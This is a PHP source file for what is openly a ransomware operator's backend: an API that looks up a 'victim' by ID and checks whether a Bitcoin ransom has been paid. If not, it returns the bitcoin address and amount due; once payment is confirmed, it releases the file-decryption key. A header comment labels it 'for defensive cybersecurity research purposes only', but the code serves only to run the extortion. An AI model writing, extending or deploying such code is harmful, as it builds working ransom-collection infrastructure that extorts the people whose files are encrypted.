<?php
/**
 * Decryption Key Distribution API
 * Provides decryption keys to verified victims
 * For defensive cybersecurity research purposes only
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

require_once '../database.php';

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception("Only POST method allowed");
    }
    
    $victim_id = $_POST['victim_id'] ?? '';
    
    if (empty($victim_id)) {
        throw new Exception("Missing victim_id parameter");
    }
    
    $db = new Database();
    
    // Get victim information
    $victim = $db->getVictimByVictimId($victim_id);
    
    if (!$victim) {
        echo json_encode([
            'success' => false,
            'error' => 'Victim not found',
            'error_code' => 'VICTIM_NOT_FOUND'
        ]);
        exit;
    }
    
    // Check if payment has been verified
    $payment = $db->getPaymentByVictimId($victim_id);
    
    if (!$payment || !$payment['payment_received']) {
        echo json_encode([
            'success' => false,
            'error' => 'Payment not verified',
            'error_code' => 'PAYMENT_NOT_VERIFIED',
            'bitcoin_address' => $payment['bitcoin_address'] ?? '',
            'amount_due' => $payment['amount_btc'] ?? 0
        ]);
        exit;
    }
    
    // Payment verified - provide decryption key
    $encryption_key = $victim['encryption_key'];
    
    if (empty($encryption_key)) {
        echo json_encode([
            'success' => false,
            'error' => 'Decryption key not available',
            'error_code' => 'KEY_NOT_AVAILABLE'
        ]);
        exit;
    }
    
    // Log key distribution
    error_log("Decryption key provided to victim: $victim_id");
    
    // Update victim status
    $db->updateVictimStatus($victim_id, 'decryption_key_provided');
    
    echo json_encode([
        'success' => true,
        'decryption_key' => $encryption_key,
        'victim_id' => $victim_id,
        'key_format' => 'hex',
        'algorithm' => 'XChaCha20-Poly1305',
        'key_length' => strlen($encryption_key) / 2, // bytes
        'provided_at' => date('Y-m-d H:i:s'),
        'timestamp' => time()
    ]);
    
} catch (Exception $e) {
    error_log("Key distribution error: " . $e->getMessage());
    
    echo json_encode([
        'success' => false,
        'error' => 'Key distribution system error',
        'details' => $e->getMessage(),
        'error_code' => 'DISTRIBUTION_ERROR',
        'timestamp' => time()
    ]);
}
?>